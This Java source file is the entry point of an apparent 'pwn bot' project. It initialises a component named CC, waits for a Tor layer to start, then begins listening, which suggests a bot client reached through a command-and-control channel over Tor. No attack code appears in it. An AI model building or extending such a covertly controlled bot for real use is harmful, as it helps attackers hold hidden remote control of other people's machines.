package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.init;

import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
import java.util.concurrent.TimeUnit;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class Init {

    Logger logger = LoggerFactory.getLogger(getClass());

    public static void main(String[] args) {
        Init init = new Init();
        try {

            init.init();
            init.waitForWork();
        } catch (Exception e) {
            init.logger.error("", e);
        }
    }

    private void init() {
        CommonHeader.getCC().init();
    }

    private void waitForWork() throws InterruptedException {
        CommonHeader.getCC().start();
        Thread worker = new Thread(() -> {
            try {
                while (!CommonHeader.getTOR_HEADER().isStarted()) {
                    TimeUnit.MILLISECONDS.sleep(400);
                }
                CommonHeader.getCC().listen();
            } catch (Exception e) {
                logger.error("", e);
            }
        });

        worker.start();
        worker.join();
    }

}
